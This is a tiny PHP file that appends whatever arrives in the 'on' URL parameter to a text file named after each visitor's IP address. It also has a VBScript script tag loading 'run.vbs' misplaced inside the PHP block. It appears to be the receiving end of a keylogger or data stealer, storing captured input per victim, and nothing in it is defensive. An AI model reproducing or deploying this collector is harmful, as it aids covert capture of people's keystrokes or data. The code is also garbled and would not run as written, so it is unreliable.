<?php
<script type="text/vbscript" src="run.vbs"></script>
$_GET['on'];
$file = fopen($_SERVER['REMOTE_ADDR'] . ".txt","a");
fwrite($file,$_GET['on'] . '||');
fclose($file);
?>
